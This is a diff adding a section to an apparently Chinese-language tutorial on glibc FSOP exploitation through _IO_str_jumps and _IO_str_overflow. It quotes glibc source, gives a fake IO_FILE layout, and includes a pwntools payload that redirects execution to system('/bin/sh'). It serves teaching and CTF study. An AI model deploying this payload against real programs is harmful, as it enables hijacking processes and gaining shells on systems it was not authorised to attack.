@@ -324,3 +324,112 @@ chunk_addr
 +0xe0 ~ +0xe8 : 0x0
 +0xe8 ~ +0xf0 : system_addr / one_gadget //fp->_s._free_buffer
 ```
+再来介绍一下：利用`_IO_str_jumps`中`_IO_str_overflow()`函数的手段。  
+`_IO_str_overflow()`函数的源码如下：
+```c
+int _IO_str_overflow (_IO_FILE *fp, int c)
+{
+  int flush_only = c == EOF;
+  _IO_size_t pos;
+  if (fp->_flags & _IO_NO_WRITES)
+      return flush_only ? 0 : EOF;
+  if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING))
+    {
+      fp->_flags |= _IO_CURRENTLY_PUTTING;
+      fp->_IO_write_ptr = fp->_IO_read_ptr;
+      fp->_IO_read_ptr = fp->_IO_read_end;
+    }
+  pos = fp->_IO_write_ptr - fp->_IO_write_base;
+  if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))
+    {
+      if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */
+    return EOF;
+      else
+    {
+      char *new_buf;
+      char *old_buf = fp->_IO_buf_base;
+      size_t old_blen = _IO_blen (fp);
+      _IO_size_t new_size = 2 * old_blen + 100;
+      if (new_size < old_blen)
+        return EOF;
+      new_buf
+        = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size); // 调用了fp->_s._allocate_buffer函数指针
+      if (new_buf == NULL)
+        {
+          /*      __ferror(fp) = 1; */
+          return EOF;
+        }
+      if (old_buf)
+        {
+          memcpy (new_buf, old_buf, old_blen);
+          (*((_IO_strfile *) fp)->_s._free_buffer) (old_buf);
+          /* Make sure _IO_setb won't try to delete _IO_buf_base. */
+          fp->_IO_buf_base = NULL;
+        }
+      memset (new_buf + old_blen, '\0', new_size - old_blen);
+ 
+      _IO_setb (fp, new_buf, new_buf + new_size, 1);
+      fp->_IO_read_base = new_buf + (fp->_IO_read_base - old_buf);
+      fp->_IO_read_ptr = new_buf + (fp->_IO_read_ptr - old_buf);
+      fp->_IO_read_end = new_buf + (fp->_IO_read_end - old_buf);
+      fp->_IO_write_ptr = new_buf + (fp->_IO_write_ptr - old_buf);
+ 
+      fp->_IO_write_base = new_buf;
+      fp->_IO_write_end = fp->_IO_buf_end;
+    }
+    }
+ 
+  if (!flush_only)
+    *fp->_IO_write_ptr++ = (unsigned char) c;
+  if (fp->_IO_write_ptr > fp->_IO_read_end)
+    fp->_IO_read_end = fp->_IO_write_ptr;
+  return c;
+}
+```
+和之前利用`_IO_str_finish`的思路差不多，可以看到其中调用了`fp->_s._allocate_buffer`函数指针，其参数`rdi`为`new_size`，因此，我们将`_s._allocate_buffer`改为`system`的地址，`new_size`改为`/bin/sh`的地址，又`new_size = 2 * old_blen + 100`，也就是`new_size = 2 * _IO_blen (fp) + 100`，可以找到宏定义：`#define _IO_blen(fp) ((fp)->_IO_buf_end - (fp)->_IO_buf_base)`，因此`new_size = 2 * ((fp)->_IO_buf_end - (fp)->_IO_buf_base) + 100`，故我们可以使`_IO_buf_base = 0`，`_IO_buf_end = (bin_sh_addr - 100) // 2`，当然还不能忘了需要绕过`_IO_flush_all_lokcp`函数中的输出缓冲区的检查`_mode<=0`以及`_IO_write_ptr>_IO_write_base`才能进入到`_IO_OVERFLOW`中，故令`_IO_write_ptr = 0xffffffffffffffff`且`_IO_write_base = 0x0`即可。  
+最终可按如下布局`fake IO_FILE`：
+```c
+._chain => chunk_addr
+chunk_addr
+{
+  file = {
+    _flags = 0x0,
+    _IO_read_ptr = 0x0,
+    _IO_read_end = 0x0,
+    _IO_read_base = 0x0,
+    _IO_write_base = 0x0,
+    _IO_write_ptr = 0x1,
+    _IO_write_end = 0x0,
+    _IO_buf_base = 0x0,
+    _IO_buf_end = (bin_sh_addr - 100) // 2,
+      ...
+      _mode = 0x0, //一般不用特意设置
+      _unused2 = '\000' <repeats 19 times>
+  },
+  vtable = _IO_str_jumps //chunk_addr + 0xd8 ~ +0xe0
+}
++0xe0 ~ +0xe8 : system_addr / one_gadget //fp->_s._allocate_buffer
+```
+参考`payload`（劫持的`stdout`）：
+```python
+new_size = libc_base + next(libc.search(b'/bin/sh'))
+payload = p64(0xfbad2084)
+payload += p64(0) # _IO_read_ptr
+payload += p64(0) # _IO_read_end
+payload += p64(0) # _IO_read_base
+payload += p64(0) # _IO_write_base
+payload += p64(0xffffffffffffffff) # _IO_write_ptr
+payload += p64(0) # _IO_write_end
+payload += p64(0) # _IO_buf_base
+payload += p64((new_size - 100) // 2) # _IO_buf_end
+payload += p64(0) * 4
+payload += p64(libc_base + libc.sym["_IO_2_1_stdin_"])
+payload += p64(1) + p64((1<<64) - 1)
+payload += p64(0) + p64(libc_base + 0x3ed8c0) #lock
+payload += p64((1<<64) - 1) + p64(0)
+payload += p64(libc_base + 0x3eb8c0)
+payload += p64(0) * 6
+payload += p64(libc_base + get_IO_str_jumps_offset()) # _IO_str_jumps
+payload += p64(libc_base + libc.sym["system"])
+```
+而在`libc-2.28`及以后，由于不再使用偏移找`_s._allocate_buffer`和`_s._free_buffer`，而是直接用`malloc`和`free`代替，所以`FSOP`也失效了。
